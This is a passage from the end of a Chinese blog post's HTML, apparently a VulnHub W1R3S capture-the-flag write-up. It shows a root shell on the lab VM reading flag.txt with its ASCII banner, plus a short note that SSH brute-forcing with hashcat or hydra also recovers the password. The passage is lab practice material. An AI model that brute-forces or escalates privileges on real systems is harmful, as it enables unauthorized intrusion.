+</span></span><span class="line"><span class="cl">    inet6 ::1/128 scope host 
+</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
+</span></span><span class="line"><span class="cl">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+</span></span><span class="line"><span class="cl">    link/ether 00:0c:29:60:2f:0a brd ff:ff:ff:ff:ff:ff
+</span></span><span class="line"><span class="cl">    inet 192.168.152.132/24 brd 192.168.152.255 scope global dynamic ens33
+</span></span><span class="line"><span class="cl">       valid_lft 1548sec preferred_lft 1548sec
+</span></span><span class="line"><span class="cl">    inet6 fe80::4564:7ee7:b335:26ec/64 scope link 
+</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>提权成功</p>
+<p>拿到flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">root@W1R3S:/# cd root
+</span></span><span class="line"><span class="cl">root@W1R3S:~# ls
+</span></span><span class="line"><span class="cl">flag.txt
+</span></span><span class="line"><span class="cl">root@W1R3S:~# cat flag.txt 
+</span></span><span class="line"><span class="cl">-----------------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  
+</span></span><span class="line"><span class="cl">  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___| 
+</span></span><span class="line"><span class="cl"> | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \ 
+</span></span><span class="line"><span class="cl"> | |__| |_| | |\  | |_| |  _ &lt;  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |
+</span></span><span class="line"><span class="cl">  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/ 
+</span></span><span class="line"><span class="cl">                                                                                    
+</span></span><span class="line"><span class="cl">-----------------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                          .-----------------TTTT_-----_______
+</span></span><span class="line"><span class="cl">                        /&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;(______O] ----------____  \______/]_
+</span></span><span class="line"><span class="cl">     __...---&#39;&#34;&#34;&#34;\_ --&#39;&#39;   Q                               ___________@
+</span></span><span class="line"><span class="cl"> |&#39;&#39;&#39;                   ._   _______________=---------&#34;&#34;&#34;&#34;&#34;&#34;&#34;
+</span></span><span class="line"><span class="cl"> |                ..--&#39;&#39;|   l L |_l   |
+</span></span><span class="line"><span class="cl"> |          ..--&#39;&#39;      .  /-___j &#39;   &#39;
+</span></span><span class="line"><span class="cl"> |    ..--&#39;&#39;           /  ,       &#39;   &#39;
+</span></span><span class="line"><span class="cl"> |--&#39;&#39;                /           `    \
+</span></span><span class="line"><span class="cl">                      L__&#39;         \    -
+</span></span><span class="line"><span class="cl">                                    -    &#39;-.
+</span></span><span class="line"><span class="cl">                                     &#39;.    /
+</span></span><span class="line"><span class="cl">                                       &#39;-./
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">----------------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">  YOU HAVE COMPLETED THE
+</span></span><span class="line"><span class="cl">               __      __  ______________________   _________
+</span></span><span class="line"><span class="cl">              /  \    /  \/_   \______   \_____  \ /   _____/
+</span></span><span class="line"><span class="cl">              \   \/\/   / |   ||       _/ _(__  &lt; \_____  \ 
+</span></span><span class="line"><span class="cl">               \        /  |   ||    |   \/       \/        \
+</span></span><span class="line"><span class="cl">                \__/\  /   |___||____|_  /______  /_______  /.INC
+</span></span><span class="line"><span class="cl">                     \/                \/       \/        \/        CHALLENGE, V 1.0
+</span></span><span class="line"><span class="cl">----------------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">CREATED BY SpecterWires
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">----------------------------------------------------------------------------------------
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="补充">补充</h2>
+<p>还有一种简便但不推荐的方式，直接使用hashcat或者hydra进行ssh的爆破，最终也是能拿到相同的密码的</p>
+</section>
+
+  
+    
+<div class="comments">
+  <script>
+      const getTheme = window.localStorage && window.localStorage.getItem("theme");
+      let theme = getTheme === 'dark' ? 'dark' : 'light';
+      let s = document.createElement('script');
+      s.src = 'https://giscus.app/client.js';
+      s.setAttribute('data-repo', 'Wh1teJ0ker\/discussion');
+      s.setAttribute('data-repo-id', 'R_kgDOOTzcZA');
+      s.setAttribute('data-category', 'Announcements');
+      s.setAttribute('data-category-id', 'DIC_kwDOOTzcZM4CoxXV');
+      s.setAttribute('data-mapping', 'pathname');
+      s.setAttribute('data-strict', '0');
+      s.setAttribute('data-reactions-enabled', '1');
+      s.setAttribute('data-emit-metadata', '0');
+      s.setAttribute('data-input-position', 'top');
+      s.setAttribute('data-theme', theme);
+      s.setAttribute('data-lang', 'zh-CN');
+      s.setAttribute('data-loading', 'lazy');
+      s.setAttribute('crossorigin', 'anonymous');
+      s.setAttribute('async', '');
+      document.querySelector('div.comments').innerHTML = '';
+      document.querySelector('div.comments').appendChild(s);
+  </script>
+</div>
+
+  
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="http://localhost:1313/post/vulnhubgreas-1q5woh.html">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>VulnHub-Jarbas</span></a>
+    
+    
+    <a class="next" href="http://localhost:1313/post/2024-pengcheng-cup-1osmmv.html"><span>2024鹏程杯</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2026 <a href="http://localhost:1313/">Wh1teJ0kerのBlog</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-up"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg>
+</a>
+
+
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
+
+        function copyingDone() {
+            copybutton.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-check"><polyline points="20 6 9 17 4 12"></polyline></svg>';
+            setTimeout(() => {
+                copybutton.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+      
+      
+      <div id="search-modal" class="search-modal" style="display: none;">
+          <div class="search-modal-content">
+              <div class="search-input-wrapper">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+                  <input type="text" id="search-input" placeholder="搜索标题、标签或正文关键字" autocomplete="off">
+                  <button type="button" id="search-clear" class="search-clear" aria-label="清除搜索">
+                      ×
+                  </button>
+                  <span class="search-shortcut">ESC</span>
+              </div>
+              <div id="search-results" class="search-results"></div>
+          </div>
+      </div>
+
+      <style>
+        #search-modal {
+          position: fixed;
+          inset: 0;
+          z-index: 2000;
+          display: none;
+          background-color: rgba(15, 23, 42, 0.6);
+          backdrop-filter: blur(14px);
+          -webkit-backdrop-filter: blur(14px);
+          align-items: center;
+          justify-content: center;
+          padding: 0 1.5rem;
+        }
+
+        #search-modal.active {
+          display: flex;
+        }
+
+        #search-modal .search-modal-content {
+          width: 100%;
+          max-width: 880px;
+          max-height: 80vh;
+          margin: 0;
+          background: transparent;
+          box-shadow: none;
+          border-radius: 0;
+          display: flex;
+          flex-direction: column;
+        }
+
+        [data-dark-mode] #search-modal .search-modal-content {
+          background: transparent;
+          border: none;
+        }
+      </style>
+    </body><script src="https://cdn.jsdelivr.net/npm/fuse.js@6.6.2"></script>
+
+<script src="/main.min.80d50982893555370f4aacc2affcf405ae67515c8053bb96ae4aa69934f4efec7c58bde5638ac91af85238507fcc283a42df3e061b5b83554fd71d3c87979053.js" integrity="sha512-gNUJgok1VTcPSqzCr/z0Ba5nUVyAU7uWrkqmmTT07&#43;x8WL3lY4rJGvhSOFB/zCg6Qt8&#43;Bhtbg1VP1x08h5eQUw==" crossorigin="anonymous" defer></script></html>
